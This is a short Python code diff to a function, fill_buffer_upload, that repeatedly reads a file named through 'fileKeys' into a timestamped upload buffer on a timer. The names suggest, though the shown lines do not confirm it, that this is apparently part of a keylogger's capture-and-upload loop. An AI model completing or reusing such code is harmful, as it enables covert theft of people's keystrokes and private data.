@@ -51,16 +51,12 @@ def fill_buffer_upload(myInode, uploadInterval):
         print(api)
     except Exception as e:
         print(e)
-    try:
-        print('inside file')
-        f = open(myInode)
-            
-    except Exception as e:
-        print(e)
+    
     while exists(myInode):
+        with open(myInode, 'r') as fileKeys:
+            bufferToUp[get_timestamp_str()]= fileKeys.read()
         print('inside exis')
         sleep(uploadInterval)      
-        bufferToUp[get_timestamp_str()]= f.read()
         print(bufferToUp)
         print("DEBUGGING SIZE: {} \n".format(sys.getsizeof(bufferToUp)))
         print(">>>>".format(api))
